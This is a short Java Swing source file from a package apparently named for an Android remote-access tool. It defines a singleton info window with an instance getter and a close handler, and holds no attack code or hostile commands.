package com.je_chen.droidRat.gui.infogui;

import com.je_chen.droidRat.gui.guisuper.GuiFather;
import com.je_chen.droidRat.gui.guisuper.GuiFatherInterface;

import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

public class InfoGui extends GuiFather implements GuiFatherInterface {
    private static InfoGui Instance;
    private JFrame jFrame;
    private JPanel jPanel;
    private String windowName;

    public static synchronized InfoGui getInstance(String windowName) {
        if (Instance == null) {
            Instance = new InfoGui();
            Instance.show(windowName);
        }
        return Instance;
    }

    @Override
    protected void inCloseEvent() {
        Instance = null;
    }
}
